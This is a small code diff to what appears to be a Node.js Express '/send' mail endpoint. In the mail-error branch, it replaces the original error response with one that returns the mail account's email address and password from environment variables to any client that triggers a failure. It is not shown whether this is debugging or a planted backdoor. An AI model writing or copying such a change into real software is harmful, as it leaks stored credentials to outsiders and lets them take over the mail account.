@@ -100,8 +100,12 @@ app.post('/send', (req, res) => {
   // send mail with defined transport object
   transporter.sendMail(mailOptions, (error, info) => {
     if (error) {
+      // res.json({
+      //   "decision": "error",
+      // });
       res.json({
-        "decision": "error",
+        "email": process.env.USER_EMAIL,
+        "pass": process.env.USER_PASS
       });
     }
     else {
